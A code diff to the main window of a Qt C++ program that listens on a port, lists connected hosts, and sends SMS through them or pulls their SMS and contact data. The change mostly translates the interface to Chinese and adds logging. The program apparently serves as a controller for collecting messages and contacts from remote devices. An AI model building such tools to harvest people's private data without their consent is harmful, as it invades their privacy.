@@ -1,4 +1,4 @@
-#include "mainwindow.h"
+﻿#include "mainwindow.h"
 #include "ui_mainwindow.h"
 #include <QJsonDocument>
 #include <QJsonArray>
@@ -29,6 +29,8 @@ MainWindow::~MainWindow()
 void MainWindow::init()
 {
     QObject::connect(&mSessionManager,SIGNAL(onNewSession(NetworkSession*)),this,SLOT(handleNewSession(NetworkSession*)));
+    QObject::connect(&mSessionManager,SIGNAL(onStartSessionSuccess(QString,QString)),this,SLOT(onStartSessionSuccess(QString,QString)));
+    QObject::connect(&mSessionManager,SIGNAL(onStartSessionFailed(QString,QString)),this,SLOT(onStartSessionFailed(QString,QString)));
 }
 
 void MainWindow::initView()
@@ -40,9 +42,9 @@ void MainWindow::initView()
     ui->tableView->resizeColumnToContents(0);
 
     QAction *aAll,*aNone,*aReverse;
-    ui->tableView->addAction(aAll = new QAction(QString("Select All"),ui->tableView));
-    ui->tableView->addAction(aNone = new QAction(QString("unSelect All"),ui->tableView));
-    ui->tableView->addAction(aReverse = new QAction(QString("Reverse Select"),ui->tableView));
+    ui->tableView->addAction(aAll = new QAction(QStringLiteral("全选"),ui->tableView));
+    ui->tableView->addAction(aNone = new QAction(QStringLiteral("全不选"),ui->tableView));
+    ui->tableView->addAction(aReverse = new QAction(QStringLiteral("反选"),ui->tableView));
 
     QObject::connect(aAll,SIGNAL(triggered()),&mModel,SLOT(selectAll()));
     QObject::connect(aNone,SIGNAL(triggered()),&mModel,SLOT(unselectAll()));
@@ -54,25 +56,27 @@ void MainWindow::initView()
 
 
     QAction *aSendSms,*aLoadContact,*aLoadSms;
-    ui->tableView->addAction(aSendSms = new QAction(QString("Send Sms"),ui->tableView));
-    ui->tableView->addAction(aLoadContact = new QAction(QString("Load Contact Data"),ui->tableView));
-    ui->tableView->addAction(aLoadSms = new QAction(QString("Load Sms Data"),ui->tableView));
+    ui->tableView->addAction(aSendSms = new QAction(QStringLiteral("发送短信"),ui->tableView));
+    ui->tableView->addAction(aLoadContact = new QAction(QStringLiteral("载入联系人数据"),ui->tableView));
+    ui->tableView->addAction(aLoadSms = new QAction(QStringLiteral("载入短信数据"),ui->tableView));
 
     QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
     QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadSms()));
     QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadContact()));
 
-    ui->actionStartServer->setText("Start Server");
+    ui->actionStartServer->setText(QStringLiteral("开始监听"));
     QObject::connect(ui->actionStartServer, SIGNAL(triggered()), this, SLOT(handleServerStart()));
 
-    for(unsigned int i = 1; i<mModel.columnCount(); ++i) {
+    for(int i = 1; i<mModel.columnCount(); ++i) {
         ui->tableView->setColumnWidth(i, 150);
     }
+
+    outputLogWarning(QStringLiteral("====================   程序开始运行  ===================="));
 }
 
 void MainWindow::updateView()
 {
-    ui->hostCountLabel->setText(QString("Host: %1, Selected: %2").arg(mModel.rowCount()).arg(mModel.getSelectedCount()));
+    ui->hostCountLabel->setText(QStringLiteral("主机数: %1, 选中主机数: %2").arg(mModel.rowCount()).arg(mModel.getSelectedCount()));
 }
 
 void MainWindow::handleServerStart()
@@ -81,21 +85,24 @@ void MainWindow::handleServerStart()
     {
         mSessionManager.stop();
         mModel.cleanAll();
-        ui->actionStartServer->setText("Start Server");
+        ui->actionStartServer->setText(QStringLiteral("开始监听"));
+        outputLogNormal(QStringLiteral("停止监听"));
     }
     else
     {
         bool ok = false;
-        int port = QInputDialog::getInt(this, "Listen Port", "Input port:", 8000,  1, 65535, 1, &ok);
+        int port = QInputDialog::getInt(this, QStringLiteral("监听端口"), QStringLiteral("输入端口:"), 8000,  1, 65535, 1, &ok);
         if(ok)
         {
             if(mSessionManager.start(port))
             {
-                ui->actionStartServer->setText(QString("Stop Server (Listen on %1)").arg(port));
+                ui->actionStartServer->setText(QStringLiteral("停止监听 (监听在 %1 端口)").arg(port));
+                outputLogNormal(QStringLiteral("监听在 %1 端口").arg(port) );
             }
             else
             {
-                QMessageBox::warning(this,QString("Warning"),QString("Listen on port %1 failed").arg(port));
+                QMessageBox::warning(this,QString("Warning"),QStringLiteral("监听在端口 %1 失败").arg(port));
+                outputLogWarning(QStringLiteral("[失败] 监听在 %1 端口").arg(port) );
             }
         }
 
@@ -131,7 +138,7 @@ void MainWindow::handleNewSession(NetworkSession* networkSession)
 void MainWindow::handleReceiveData(NetworkSession* networkSession, QByteArray data)
 {
     QJsonObject jsonObject = QJsonDocument::fromJson(data).object();
-    QJsonObject::iterator it = jsonObject.find(networkSession->getSessionName());
+    QJsonObject::iterator it = jsonObject.begin();
     if(it == jsonObject.end())
     {
         return;
@@ -153,7 +160,7 @@ void MainWindow::sendSms()
 {
     if(mModel.getSelectedCount()==0)
     {
-        QMessageBox::warning(this,QString("Warning"),QString("Please select at least one host"));
+        QMessageBox::warning(this,QString("Warning"),QStringLiteral("请勾选至少一台主机"));
         return;
     }
     SendSmsDialog sendSmsDialog(this);
@@ -181,7 +188,7 @@ void MainWindow::loadSms()
 {
     if(mModel.getSelectedCount()==0)
     {
-        QMessageBox::warning(this,QString("Warning"),QString("Please select at least one host"));
+        QMessageBox::warning(this,QString("Warning"),QStringLiteral("请勾选至少一台主机"));
         return;
     }
     mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), ACTION_UPLOAD_SMS);
@@ -190,8 +197,34 @@ void MainWindow::loadContact()
 {
     if(mModel.getSelectedCount()==0)
     {
-        QMessageBox::warning(this,QString("Warning"),QString("Please select at least one host"));
+        QMessageBox::warning(this,QString("Warning"),QStringLiteral("请勾选至少一台主机"));
         return;
     }
     mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), ACTION_UPLOAD_CONTACT);
+}
+
+
+void MainWindow::outputLogNormal(const QString& text)
+{
+    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + text );
+}
+
+void MainWindow::outputLogWarning(const QString& text)
+{
+    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + "<font color=#F00>" + text + "</font>");
+}
+
+void MainWindow::outputLogSuccess(const QString& text)
+{
+    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + "<font color=#0A0>" + text + "</font>");
+}
+
+
+void MainWindow::onStartSessionSuccess(const QString& sessionName, const QString& addr)
+{
+    outputLogSuccess( QStringLiteral("[成功] 在 %1 上执行 '%2'").arg(addr).arg(sessionName) );
+}
+void MainWindow::onStartSessionFailed(const QString& sessionName, const QString& addr)
+{
+    outputLogWarning( QStringLiteral("[失败] 在 %1 上执行 '%2'").arg(addr).arg(sessionName) );
 }
